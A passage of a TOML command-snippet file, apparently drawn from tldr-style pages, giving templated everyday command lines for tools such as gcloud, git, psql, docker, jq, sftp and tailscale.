  description = "Export data from a specific Cloud SQL instance to a Google Cloud Storage bucket as a SQL dump file"
  command = "gcloud sql export sql <instance> gs://<bucket_name>/<file_name>"
  output = ""

[[snippets]]
  description = "Export data asynchronously, returning immediately without waiting for the operation to complete"
  command = "gcloud sql export sql <instance> gs://<bucket_name>/<file_name> --async"
  output = ""

[[snippets]]
  description = "Export data from specific databases within the Cloud SQL instance"
  command = "gcloud sql export sql <instance> gs://<bucket_name>/<file_name> --database=<database1,database2,...>"
  output = ""

[[snippets]]
  description = "Export specific tables from a specified database within the Cloud SQL instance"
  command = "gcloud sql export sql <instance> gs://<bucket_name>/<file_name> --database=<database> --table=<table1,table2,...>"
  output = ""

[[snippets]]
  description = "Export data while offloading the operation to a temporary instance to reduce strain on the source instance"
  command = "gcloud sql export sql <instance> gs://<bucket_name>/<file_name> --offload"
  output = ""

[[snippets]]
  description = "Export data and compress the output with `gzip`"
  command = "gcloud sql export sql <instance> gs://<bucket_name>/<file_name>.gz"
  output = ""

[[snippets]]
  description = "Compile a bitcode or IR file to an assembly file with the same base name"
  command = "llc <path/to/file.ll>"
  output = ""

[[snippets]]
  description = "Enable all optimizations"
  command = "llc -O3 <path/to/input.ll>"
  output = ""

[[snippets]]
  description = "Output assembly to a specific file"
  command = "llc --output <path/to/output.s>"
  output = ""

[[snippets]]
  description = "Emit fully relocatable, position independent code"
  command = "llc -relocation-model=pic <path/to/input.ll>"
  output = ""

[[snippets]]
  description = "Compute the object ID without storing it"
  command = "git hash-object <path/to/file>"
  output = ""

[[snippets]]
  description = "Compute the object ID and store it in the Git database"
  command = "git hash-object -w <path/to/file>"
  output = ""

[[snippets]]
  description = "Compute the object ID specifying the object type"
  command = "git hash-object -t <blob|commit|tag|tree> <path/to/file>"
  output = ""

[[snippets]]
  description = "Compute the object ID from `stdin`"
  command = "cat <path/to/file> | git hash-object --stdin"
  output = ""

[[snippets]]
  description = "Start a daemon with the default settings"
  command = "distccd --daemon"
  output = ""

[[snippets]]
  description = "Start a daemon, accepting connections from IPv4 private network ranges"
  command = "distccd --daemon --allow-private"
  output = ""

[[snippets]]
  description = "Start a daemon, accepting connections from a specific network address or address range"
  command = "distccd --daemon --allow <ip_address|network_prefix>"
  output = ""

[[snippets]]
  description = "Start a daemon with a lowered priority that can run a maximum of 4 tasks at a time"
  command = "distccd --daemon --jobs <4> --nice <5>"
  output = ""

[[snippets]]
  description = "Start a daemon and register it via mDNS/DNS-SD (Zeroconf)"
  command = "distccd --daemon --zeroconf"
  output = ""

[[snippets]]
  description = "Connect to the database. By default, it connects to the local socket using port 5432 with the currently logged in user"
  command = "psql <database>"
  output = ""

[[snippets]]
  description = "Connect to the database on given server host running on given port with given username, without a password prompt"
  command = "psql -h <host> -p <port> -U <username> <database>"
  output = ""

[[snippets]]
  description = "Connect to the database; user will be prompted for password"
  command = "psql -h <host> -p <port> -U <username> -W <database>"
  output = ""

[[snippets]]
  description = "Execute a single SQL query or PostgreSQL command on the given database (useful in shell scripts)"
  command = "psql -c '<query>' <database>"
  output = ""

[[snippets]]
  description = "Execute commands from a file on the given database"
  command = "psql <database> -f <file.sql>"
  output = ""

[[snippets]]
  description = "Copy a file or directory from the host to a container"
  command = "docker cp <path/to/file_or_directory_on_host> <container_name>:<path/to/file_or_directory_in_container>"
  output = ""

[[snippets]]
  description = "Copy a file or directory from a container to the host"
  command = "docker cp <container_name>:<path/to/file_or_directory_in_container> <path/to/file_or_directory_on_host>"
  output = ""

[[snippets]]
  description = "Copy a file or directory from the host to a container, following symlinks (copies the symlinked files directly, not the symlinks themselves)"
  command = "docker cp --follow-link <path/to/symlink_on_host> <container_name>:<path/to/file_or_directory_in_container>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "clj"
  output = ""

[[snippets]]
  description = "Execute a function"
  command = "clj -X <namespace/function_name>"
  output = ""

[[snippets]]
  description = "Run the main function of a specified namespace"
  command = "clj -M -m <namespace> <args>"
  output = ""

[[snippets]]
  description = "Prepare a project by resolving dependencies, downloading libraries, and making/caching classpaths"
  command = "clj -P"
  output = ""

[[snippets]]
  description = "Start an nREPL server with the CIDER middleware"
  command = "clj -Sdeps '{:deps {nrepl {:mvn/version ""0.7.0""} cider/cider-nrepl {:mvn/version ""0.25.2""}}}' -m nrepl.cmdline --middleware '[""cider.nrepl/cider-middleware""]' --interactive"
  output = ""

[[snippets]]
  description = "Start a REPL for ClojureScript and open a web browser"
  command = "clj -Sdeps '{:deps {org.clojure/clojurescript {:mvn/version ""1.10.758""}}}' --main cljs.main --repl"
  output = ""

[[snippets]]
  description = "Read a value from the key-value store"
  command = "consul kv get <key>"
  output = ""

[[snippets]]
  description = "Store a new key-value pair"
  command = "consul kv put <key> <value>"
  output = ""

[[snippets]]
  description = "Delete a key-value pair"
  command = "consul kv delete <key>"
  output = ""

[[snippets]]
  description = "Download a specific torrent"
  command = "transmission-cli <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Download a torrent to a specific directory"
  command = "transmission-cli --download-dir <path/to/download_directory> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Create a torrent file from a specific file or directory"
  command = "transmission-cli --new <path/to/source_file_or_directory>"
  output = ""

[[snippets]]
  description = "Specify the download speed limit (in KB/s)"
  command = "transmission-cli --downlimit <50> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Specify the upload speed limit (in KB/s)"
  command = "transmission-cli --uplimit <50> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Use a specific port for connections"
  command = "transmission-cli --port <port_number> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Force encryption for peer connections"
  command = "transmission-cli --encryption-required <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Use a Bluetack-formatted peer blocklist"
  command = "transmission-cli --blocklist <blocklist_url|path/to/blocklist> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively detect and decode a string"
  command = "dcode ""<NjM3YTQyNzQ1YTQ0NGUzMg==>"""
  output = ""

[[snippets]]
  description = "Rotate a string by the specified offset"
  command = "dcode -rot <11> ""<spwwz hzcwo>"""
  output = ""

[[snippets]]
  description = "Rotate a string by all 26 possible offsets"
  command = "dcode -rot <all> ""<bpgkta xh qtiitg iwpc sr>"""
  output = ""

[[snippets]]
  description = "Reverse a string"
  command = "dcode -rev ""<hello world>"""
  output = ""

[[snippets]]
  description = "Execute a specific expression (print a colored and formatted JSON output)"
  command = "<cat path/to/file.json> | jq '.'"
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "<cat path/to/file.json> | jq --from-file <path/to/script.jq>"
  output = ""

[[snippets]]
  description = "Pass specific arguments"
  command = "<cat path/to/file.json> | jq <--arg ""name1"" ""value1"" --arg ""name2"" ""value2"" ...> '<. + $ARGS.named>'"
  output = ""

[[snippets]]
  description = "Print specific keys"
  command = "<cat path/to/file.json> | jq '<.key1, .key2, ...>'"
  output = ""

[[snippets]]
  description = "Print specific array items"
  command = "<cat path/to/file.json> | jq '<.[index1], .[index2], ...>'"
  output = ""

[[snippets]]
  description = "Print all array items/object keys"
  command = "<cat path/to/file.json> | jq '.[]'"
  output = ""

[[snippets]]
  description = "Add/remove specific keys"
  command = "<cat path/to/file.json> | jq '. <+|-> <{""key1"": ""value1"", ""key2"": ""value2"", ...>}'"
  output = ""

[[snippets]]
  description = "Start Mosquitto"
  command = "mosquitto"
  output = ""

[[snippets]]
  description = "Specify a configuration file to use"
  command = "mosquitto --config-file <path/to/file.conf>"
  output = ""

[[snippets]]
  description = "Listen on a specific port"
  command = "mosquitto --port <8883>"
  output = ""

[[snippets]]
  description = "Daemonize by forking into the background"
  command = "mosquitto --daemon"
  output = ""

[[snippets]]
  description = "List all available backup revisions for all packages"
  command = "tlmgr restore"
  output = ""

[[snippets]]
  description = "List all available backup revisions for a specific package"
  command = "tlmgr restore <package>"
  output = ""

[[snippets]]
  description = "Restore a specific revision of a specific package"
  command = "tlmgr restore <package> <revision>"
  output = ""

[[snippets]]
  description = "Restore the latest revision of all backed-up packages"
  command = "tlmgr restore --all"
  output = ""

[[snippets]]
  description = "Restore a package from a custom backup directory"
  command = "tlmgr restore <package> <revision> --backupdir <path/to/backup_directory>"
  output = ""

[[snippets]]
  description = "Perform a dry-run and print all taken actions without making them"
  command = "tlmgr restore --dry-run <package> <revision>"
  output = ""

[[snippets]]
  description = "Open a file or directory"
  command = "atom <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Open a file or directory in a [n]ew window"
  command = "atom -n <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Open a file or directory in an existing window"
  command = "atom --add <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Open Atom in safe mode (does not load any additional packages)"
  command = "atom --safe"
  output = ""

[[snippets]]
  description = "Prevent Atom from forking into the background, keeping Atom attached to the terminal"
  command = "atom --foreground"
  output = ""

[[snippets]]
  description = "Wait for Atom window to close before returning (useful for Git commit editor)"
  command = "atom --wait"
  output = ""

[[snippets]]
  description = "Generate a bonsai in live mode"
  command = "cbonsai -l"
  output = ""

[[snippets]]
  description = "Generate a bonsai in infinite mode"
  command = "cbonsai -i"
  output = ""

[[snippets]]
  description = "Append a message to the bonsai"
  command = "cbonsai -m ""<message>"""
  output = ""

[[snippets]]
  description = "Display extra information about the bonsai"
  command = "cbonsai -v"
  output = ""

[[snippets]]
  description = "Display help"
  command = "cbonsai -h"
  output = ""

[[snippets]]
  description = "Check commits for a GPG signature"
  command = "git verify-commit <commit_hash1 optional_commit_hash2 ...>"
  output = ""

[[snippets]]
  description = "Check commits for a GPG signature and show details of each commit"
  command = "git verify-commit <commit_hash1 optional_commit_hash2 ...> --verbose"
  output = ""

[[snippets]]
  description = "Check commits for a GPG signature and print the raw details"
  command = "git verify-commit <commit_hash1 optional_commit_hash2 ...> --raw"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "nvim <path/to/file>"
  output = ""

[[snippets]]
  description = "Enter text editing mode (insert mode)"
  command = "<Esc>i"
  output = ""

[[snippets]]
  description = "Copy ("yank") or cut ("delete") the current line (paste it with `P`)"
  command = "<Esc><yy|dd>"
  output = ""

[[snippets]]
  description = "Enter normal mode and undo the last operation"
  command = "<Esc>u"
  output = ""

[[snippets]]
  description = "Search for a pattern in the file (press `n`/`N` to go to next/previous match)"
  command = "<Esc>/<search_pattern><Enter>"
  output = ""

[[snippets]]
  description = "Perform a regular expression substitution in the whole file"
  command = "<Esc>:%s/<regular_expression>/<replacement>/g<Enter>"
  output = ""

[[snippets]]
  description = "Enter normal mode and save (write) the file, and quit"
  command = "<Esc>:wq<Enter>"
  output = ""

[[snippets]]
  description = "Quit without saving"
  command = "<Esc>:q!<Enter>"
  output = ""

[[snippets]]
  description = "Start a virtual machine"
  command = "VBoxManage startvm <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Start a virtual machine with the specified UI mode"
  command = "VBoxManage startvm <vm_name|uuid> --type <headless|gui|sdl|separate>"
  output = ""

[[snippets]]
  description = "Specify a password file to start an encrypted virtual machine"
  command = "VBoxManage startvm <vm_name|uuid> --password <path/to/password_file>"
  output = ""

[[snippets]]
  description = "Specify a password ID to start an encrypted virtual machine"
  command = "VBoxManage startvm  <vm_name|uuid> --password-id <password_id>"
  output = ""

[[snippets]]
  description = "Start a virtual machine with an environment variable pair name value"
  command = "VBoxManage startvm  <vm_name|uuid> --put-env=<name>=<value>"
  output = ""

[[snippets]]
  description = "Display system information"
  command = "fastfetch"
  output = ""

[[snippets]]
  description = "Fetch a specific structure"
  command = "fastfetch --structure <structure>"
  output = ""

[[snippets]]
  description = "Load a custom configuration file"
  command = "fastfetch --load-config <path/to/config_file>"
  output = ""

[[snippets]]
  description = "Use a specific logo"
  command = "fastfetch --logo <logo>"
  output = ""

[[snippets]]
  description = "Use a specific color for the keys and title"
  command = "fastfetch --color <blue>"
  output = ""

[[snippets]]
  description = "Count the number of packets sent from each source address appearing in a pcap file"
  command = "ipaggcreate --src <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Group and count packets read from a network interface by IP packet length"
  command = "ipaggcreate --interface <eth0> --length"
  output = ""

[[snippets]]
  description = "Count the number of bytes sent between each address pair appearing in a pcap file"
  command = "ipaggcreate --address-pairs --bytes <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Print the total number of commits"
  command = "git count"
  output = ""

[[snippets]]
  description = "Print the number of commits per contributor and the total number of commits"
  command = "git count --all"
  output = ""

[[snippets]]
  description = "Bind to a specific port on localhost"
  command = "guacd -b <127.0.0.1> -l <4823>"
  output = ""

[[snippets]]
  description = "Start in debug mode, keeping the process in the foreground"
  command = "guacd -f -L <debug>"
  output = ""

[[snippets]]
  description = "Start with TLS support"
  command = "guacd -C <my-cert.crt> -K <my-key.pem>"
  output = ""

[[snippets]]
  description = "Write the PID to a file"
  command = "guacd -p <path/to/file.pid>"
  output = ""

[[snippets]]
  description = "Update existing file or create a new `History.md` file with the commit messages since the latest Git tag"
  command = "git changelog"
  output = ""

[[snippets]]
  description = "List commits from the current version"
  command = "git changelog --list"
  output = ""

[[snippets]]
  description = "List a range of commits from the tag named `2.1.0` to now"
  command = "git changelog --list --start-tag <2.1.0>"
  output = ""

[[snippets]]
  description = "List pretty formatted range of commits between the tag `0.5.0` and the tag `1.0.0`"
  command = "git changelog --start-tag <0.5.0> --final-tag <1.0.0>"
  output = ""

[[snippets]]
  description = "List pretty formatted range of commits between the commit `0b97430` and the tag `1.0.0`"
  command = "git changelog --start-commit <0b97430> --final-tag <1.0.0>"
  output = ""

[[snippets]]
  description = "Specify `CHANGELOG.md` as the output file"
  command = "git changelog <CHANGELOG.md>"
  output = ""

[[snippets]]
  description = "Replace contents of current changelog file entirely"
  command = "git changelog --prune-old"
  output = ""

[[snippets]]
  description = "Show status of all minions"
  command = "salt-run manage.status"
  output = ""

[[snippets]]
  description = "Show all minions which are disconnected"
  command = "salt-run manage.up"
  output = ""

[[snippets]]
  description = "View last logins, their duration and other information as read from `/var/log/wtmp`"
  command = "last"
  output = ""

[[snippets]]
  description = "Specify how many of the last logins to show"
  command = "last -n <login_count>"
  output = ""

[[snippets]]
  description = "Print the full date and time for entries and then display the hostname column last to prevent truncation"
  command = "last -F -a"
  output = ""

[[snippets]]
  description = "View all logins by a specific user and show the IP address instead of the hostname"
  command = "last <username> -i"
  output = ""

[[snippets]]
  description = "View all recorded reboots (i.e., the last logins of the pseudo user "reboot")"
  command = "last reboot"
  output = ""

[[snippets]]
  description = "View all recorded shutdowns (i.e., the last logins of the pseudo user "shutdown")"
  command = "last shutdown"
  output = ""

[[snippets]]
  description = "Execute a `dolt` subcommand"
  command = "dolt <subcommand>"
  output = ""

[[snippets]]
  description = "List available subcommands"
  command = "dolt help"
  output = ""

[[snippets]]
  description = "List all the currently connected printers"
  command = "lpinfo -v"
  output = ""

[[snippets]]
  description = "List all the currently installed printer drivers"
  command = "lpinfo -m"
  output = ""

[[snippets]]
  description = "Search installed printer drivers by make and model"
  command = "lpinfo --make-and-model ""<printer_model>"" -m"
  output = ""

[[snippets]]
  description = "Merge a branch into your current branch"
  command = "git merge <branch_name>"
  output = ""

[[snippets]]
  description = "Edit the merge message"
  command = "git merge --edit <branch_name>"
  output = ""

[[snippets]]
  description = "Merge a branch and create a merge commit"
  command = "git merge --no-ff <branch_name>"
  output = ""

[[snippets]]
  description = "Abort a merge in case of conflicts"
  command = "git merge --abort"
  output = ""

[[snippets]]
  description = "Merge using a specific strategy"
  command = "git merge --strategy <strategy> --strategy-option <strategy_option> <branch_name>"
  output = ""

[[snippets]]
  description = "List files one per line"
  command = "colorls -1"
  output = ""

[[snippets]]
  description = "List all files, including hidden files"
  command = "colorls --all"
  output = ""

[[snippets]]
  description = "Long format list (permissions, ownership, size, and modification date) of all files"
  command = "colorls --long --all"
  output = ""

[[snippets]]
  description = "Only list directories"
  command = "colorls --dirs"
  output = ""

[[snippets]]
  description = "Compare files (lists changes to turn `old_file` into `new_file`)"
  command = "diff <old_file> <new_file>"
  output = ""

[[snippets]]
  description = "Compare files, ignoring white spaces"
  command = "diff --ignore-all-space <old_file> <new_file>"
  output = ""

[[snippets]]
  description = "Compare files, showing the differences side by side"
  command = "diff --side-by-side <old_file> <new_file>"
  output = ""

[[snippets]]
  description = "Compare files, showing the differences in unified format (as used by `git diff`)"
  command = "diff --unified <old_file> <new_file>"
  output = ""

[[snippets]]
  description = "Compare directories recursively (shows names for differing files/directories as well as changes made to files)"
  command = "diff --recursive <old_directory> <new_directory>"
  output = ""

[[snippets]]
  description = "Compare directories, only showing the names of files that differ"
  command = "diff --recursive --brief <old_directory> <new_directory>"
  output = ""

[[snippets]]
  description = "Create a patch file for Git from the differences of two text files, treating nonexistent files as empty"
  command = "diff --text --unified --new-file <old_file> <new_file> > <diff.patch>"
  output = ""

[[snippets]]
  description = "Open a PDF on the first page"
  command = "mupdf <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a PDF on page 3"
  command = "mupdf <path/to/file> <3>"
  output = ""

[[snippets]]
  description = "Open a password secured PDF"
  command = "mupdf -p <password> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a PDF with an initial zoom level, specified as DPI, of 72"
  command = "mupdf -r <72> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a PDF with inverted color"
  command = "mupdf -I <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a PDF tinted red #FF0000 (hexadecimal color syntax RRGGBB)"
  command = "mupdf -C <FF0000>"
  output = ""

[[snippets]]
  description = "Open a PDF without anti-aliasing (0 = off, 8 = best)"
  command = "mupdf -A <0>"
  output = ""

[[snippets]]
  description = "List all commits on the current branch"
  command = "git rev-list <HEAD>"
  output = ""

[[snippets]]
  description = "Print the latest commit that changed (add/edit/remove) a specific file on the current branch"
  command = "git rev-list -n 1 HEAD -- <path/to/file>"
  output = ""

[[snippets]]
  description = "List commits more recent than a specific date, on a specific branch"
  command = "git rev-list --since=<'2019-12-01 00:00:00'> <branch_name>"
  output = ""

[[snippets]]
  description = "List all merge commits on a specific commit"
  command = "git rev-list --merges <commit>"
  output = ""

[[snippets]]
  description = "Print the number of commits since a specific tag"
  command = "git rev-list <tag_name>..HEAD --count"
  output = ""

[[snippets]]
  description = "Delete a ref, useful for soft resetting the first commit"
  command = "git update-ref -d <HEAD>"
  output = ""

[[snippets]]
  description = "Update ref with a message"
  command = "git update-ref -m <message> <HEAD> <4e95e05>"
  output = ""

[[snippets]]
  description = "Show the current TeX Live configuration"
  command = "tlmgr conf"
  output = ""

[[snippets]]
  description = "Show the current `texmf`, `tlmgr`, or `updmap` configuration"
  command = "tlmgr conf <texmf|tlmgr|updmap>"
  output = ""

[[snippets]]
  description = "Show only a specific configuration option"
  command = "tlmgr conf <texmf|tlmgr|updmap> <configuration_key>"
  output = ""

[[snippets]]
  description = "Set a specific configuration option"
  command = "tlmgr conf <texmf|tlmgr|updmap> <configuration_key> <value>"
  output = ""

[[snippets]]
  description = "Delete a specific configuration option"
  command = "tlmgr conf <texmf|tlmgr|updmap> --delete <configuration_key>"
  output = ""

[[snippets]]
  description = "Disable the execution of system calls via `\write18`"
  command = "tlmgr conf texmf <shell_escape> <0>"
  output = ""

[[snippets]]
  description = "Show all additional `texmf` trees"
  command = "tlmgr conf auxtrees show"
  output = ""

[[snippets]]
  description = "Create a new resource group"
  command = "az group create --name <name> --location <location>"
  output = ""

[[snippets]]
  description = "Check if a resource group exists"
  command = "az group exists --name <name>"
  output = ""

[[snippets]]
  description = "Delete a resource group"
  command = "az group delete --name <name>"
  output = ""

[[snippets]]
  description = "Wait until a condition of the resource group is met"
  command = "az group wait --name <name> --<created|deleted|exists|updated>"
  output = ""

[[snippets]]
  description = "Find files containing "foo" and print the files with highlighted matches"
  command = "pt <foo>"
  output = ""

[[snippets]]
  description = "Find files containing "foo" and display count of matches in each file"
  command = "pt -c <foo>"
  output = ""

[[snippets]]
  description = "Find files containing "foo" as a whole word and ignore its case"
  command = "pt -wi <foo>"
  output = ""

[[snippets]]
  description = "Find "foo" in files with a given extension using a regular expression"
  command = "pt -G='<\.bar$>' <foo>"
  output = ""

[[snippets]]
  description = "Find files whose contents match the regular expression, up to 2 directories deep"
  command = "pt --depth=<2> -e '<^ba[rz]*$>'"
  output = ""

[[snippets]]
  description = "Bundle a Node.js application"
  command = "ncc build <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle and minify a Node.js application"
  command = "ncc build --minify <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle and minify a Node.js application and generate source maps"
  command = "ncc build --source-map <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Automatically recompile on changes to source files"
  command = "ncc build --watch <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle a Node.js application into a temporary directory and run it for testing"
  command = "ncc run <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Clean the `ncc` cache"
  command = "ncc clean cache"
  output = ""

[[snippets]]
  description = "List supported formats"
  command = "ogrinfo --formats"
  output = ""

[[snippets]]
  description = "List layers of a data source"
  command = "ogrinfo <path/to/input.gpkg>"
  output = ""

[[snippets]]
  description = "Get detailed information about a specific layer of a data source"
  command = "ogrinfo <path/to/input.gpkg> <layer_name>"
  output = ""

[[snippets]]
  description = "Show summary information about a specific layer of a data source"
  command = "ogrinfo -so <path/to/input.gpkg> <layer_name>"
  output = ""

[[snippets]]
  description = "Show summary of all layers of the data source"
  command = "ogrinfo -so -al <path/to/input.gpkg>"
  output = ""

[[snippets]]
  description = "Show detailed information of features matching a condition"
  command = "ogrinfo -where '<attribute_name > 42>' <path/to/input.gpkg> <layer_name>"
  output = ""

[[snippets]]
  description = "Update a layer in the data source with SQL"
  command = "ogrinfo <path/to/input.geojson> -dialect SQLite -sql ""<UPDATE input SET attribute_name = 'foo'>"""
  output = ""

[[snippets]]
  description = "Rotate a PNM image by some angle (measured in degrees, counter-clockwise)"
  command = "pnmrotate <angle> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the background color exposed by rotating the input image"
  command = "pnmrotate -background <color> <angle> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Disable anti-aliasing, improving performance but decreasing quality"
  command = "pnmrotate -noantialias <angle> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Run an app in a temporary virtual environment"
  command = "pipx run <pycowsay> <moo>"
  output = ""

[[snippets]]
  description = "Install a package in a virtual environment and add entry points to path"
  command = "pipx install <package>"
  output = ""

[[snippets]]
  description = "List installed packages"
  command = "pipx list"
  output = ""

[[snippets]]
  description = "Run an app in a temporary virtual environment with a package name different from the executable"
  command = "pipx run --spec <httpx-cli> <httpx> <http://www.github.com>"
  output = ""

[[snippets]]
  description = "Inject dependencies into an existing virtual environment"
  command = "pipx inject <package> <dependency1 dependency2 ...>"
  output = ""

[[snippets]]
  description = "Install a package in a virtual environment with pip arguments"
  command = "pipx install --pip-args='<pip-args>' <package>"
  output = ""

[[snippets]]
  description = "Connect to a remote server and enter an interactive command mode"
  command = "sftp <remote_user>@<remote_host>"
  output = ""

[[snippets]]
  description = "Connect using an alternate port"
  command = "sftp -P <remote_port> <remote_user>@<remote_host>"
  output = ""

[[snippets]]
  description = "Connect using a predefined host (in `~/.ssh/config`)"
  command = "sftp <host>"
  output = ""

[[snippets]]
  description = "Transfer remote file to the local system"
  command = "get </path/remote_file>"
  output = ""

[[snippets]]
  description = "Transfer local file to the remote system"
  command = "put </path/local_file>"
  output = ""

[[snippets]]
  description = "Transfer remote directory to the local system recursively (works with `put` too)"
  command = "get -R </path/remote_directory>"
  output = ""

[[snippets]]
  description = "Get list of files on local machine"
  command = "lls"
  output = ""

[[snippets]]
  description = "Get list of files on remote machine"
  command = "ls"
  output = ""

[[snippets]]
  description = "Sync two directories (creates log first time these two directories are synchronized)"
  command = "unison <path/to/directory_1> <path/to/directory_2>"
  output = ""

[[snippets]]
  description = "Automatically accept the (non-conflicting) defaults"
  command = "unison <path/to/directory_1> <path/to/directory_2> -auto"
  output = ""

[[snippets]]
  description = "Ignore some files using a pattern"
  command = "unison <path/to/directory_1> <path/to/directory_2> -ignore <pattern>"
  output = ""

[[snippets]]
  description = "View documentation"
  command = "unison -doc <topics>"
  output = ""

[[snippets]]
  description = "Highlight file syntax and print to `stdout` (language is inferred from the file extension)"
  command = "pygmentize <file.py>"
  output = ""

[[snippets]]
  description = "Explicitly set the language for syntax highlighting"
  command = "pygmentize -l <javascript> <input_file>"
  output = ""

[[snippets]]
  description = "List available lexers (processors for input languages)"
  command = "pygmentize -L lexers"
  output = ""

[[snippets]]
  description = "Save output to a file in HTML format"
  command = "pygmentize -f html -o <output_file.html> <input_file.py>"
  output = ""

[[snippets]]
  description = "List available output formats"
  command = "pygmentize -L formatters"
  output = ""

[[snippets]]
  description = "Output an HTML file, with additional formatter options (full page, with line numbers)"
  command = "pygmentize -f html -O ""full,linenos=True"" -o <output_file.html> <input_file>"
  output = ""

[[snippets]]
  description = "Mount remote directory"
  command = "sshfs <username>@<remote_host>:<remote_directory> <mountpoint>"
  output = ""

[[snippets]]
  description = "Unmount remote directory"
  command = "umount <mountpoint>"
  output = ""

[[snippets]]
  description = "Mount remote directory from server with specific port"
  command = "sshfs <username>@<remote_host>:<remote_directory> -p <2222>"
  output = ""

[[snippets]]
  description = "Use compression"
  command = "sshfs <username>@<remote_host>:<remote_directory> -C"
  output = ""

[[snippets]]
  description = "Follow symbolic links"
  command = "sshfs -o follow_symlinks <username>@<remote_host>:<remote_directory> <mountpoint>"
  output = ""

[[snippets]]
  description = "Tag a Git repo and signing the resulting link file"
  command = "in-toto-run -n <tag> --products <.> -k <key_file> -- <git tag v1.0>"
  output = ""

[[snippets]]
  description = "Create a tarball, storing files as materials and the tarball as product"
  command = "in-toto-run -n <package> -m <project> -p <project.tar.gz> -- <tar czf project.tar.gz project>"
  output = ""

[[snippets]]
  description = "Generate signed attestations for review work"
  command = "in-toto-run -n <review> -k <key_file> -m <document.pdf> -x"
  output = ""

[[snippets]]
  description = "Scan the image using Trivy and generate link file"
  command = "in-toto-run -n <scan> -k <key_file> -p <report.json> -- </bin/sh -c ""trivy -o report.json -f json <IMAGE>"">"
  output = ""

[[snippets]]
  description = "Create and push a release"
  command = "git release <tag_name>"
  output = ""

[[snippets]]
  description = "Create and push a signed release"
  command = "git release <tag_name> -s"
  output = ""

[[snippets]]
  description = "Create and push a release with a message"
  command = "git release <tag_name> -m ""<message>"""
  output = ""

[[snippets]]
  description = "Add a new user to a password file (will prompt to enter the password)"
  command = "mosquitto_passwd <path/to/password_file> <username>"
  output = ""

[[snippets]]
  description = "Create the password file if it doesn't already exist"
  command = "mosquitto_passwd -c <path/to/password_file> <username>"
  output = ""

[[snippets]]
  description = "Delete the specified username instead"
  command = "mosquitto_passwd -D <path/to/password_file> <username>"
  output = ""

[[snippets]]
  description = "Upgrade an old plain-text password file to a hashed password file"
  command = "mosquitto_passwd -U <path/to/password_file>"
  output = ""

[[snippets]]
  description = "Create a new mkdocs project"
  command = "mkdocs new <project_name>"
  output = ""

[[snippets]]
  description = "Serve the project in the current directory using the mkdocs dev-server"
  command = "mkdocs serve"
  output = ""

[[snippets]]
  description = "Build the documentation in the current directory"
  command = "mkdocs build"
  output = ""

[[snippets]]
  description = "Deploy the documentation in the current directory to GitHub pages"
  command = "mkdocs gh-deploy"
  output = ""

[[snippets]]
  description = "List installed packages"
  command = "pip freeze"
  output = ""

[[snippets]]
  description = "List installed packages and write it to the `requirements.txt` file"
  command = "pip freeze > requirements.txt"
  output = ""

[[snippets]]
  description = "List installed packages in a virtual environment, excluding globally installed packages"
  command = "pip freeze --local > requirements.txt"
  output = ""

[[snippets]]
  description = "List installed packages in the user-site"
  command = "pip freeze --user > requirements.txt"
  output = ""

[[snippets]]
  description = "List all packages, including `pip`, `distribute`, `setuptools`, and `wheel` (they are skipped by default)"
  command = "pip freeze --all > requirements.txt"
  output = ""

[[snippets]]
  description = "Check a table"
  command = "mysqlcheck --check <table>"
  output = ""

[[snippets]]
  description = "Check a table and provide credentials to access it"
  command = "mysqlcheck --check <table> --user <username> --password <password>"
  output = ""

[[snippets]]
  description = "Repair a table"
  command = "mysqlcheck --repair <table>"
  output = ""

[[snippets]]
  description = "Optimize a table"
  command = "mysqlcheck --optimize <table>"
  output = ""

[[snippets]]
  description = "Start one or more destination(s)"
  command = "cupsenable <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Resume printing of pending jobs of a destination (use after `cupsdisable` with `--hold`)"
  command = "cupsenable --release <destination>"
  output = ""

[[snippets]]
  description = "Cancel all jobs of the specified destination(s)"
  command = "cupsenable -c <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Calculate the parent directory of a given path"
  command = "dirname <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Calculate the parent directory of multiple paths"
  command = "dirname <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Delimit output with a NUL character instead of a newline (useful when combining with `xargs`)"
  command = "dirname --zero <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Connect to Tailscale"
  command = "sudo tailscale up"
  output = ""

[[snippets]]
  description = "Connect and offer the current machine to be an exit node for internet traffic"
  command = "sudo tailscale up --advertise-exit-node"
  output = ""

[[snippets]]
  description = "Connect using a specific node for internet traffic"
  command = "sudo tailscale up --exit-node=<exit_node_ip>"
  output = ""

[[snippets]]
  description = "Connect and block incoming connections to the current node"
  command = "sudo tailscale up --shields-up"
  output = ""

[[snippets]]
  description = "Connect and don't accept DNS configuration from the admin panel (defaults to `true`)"
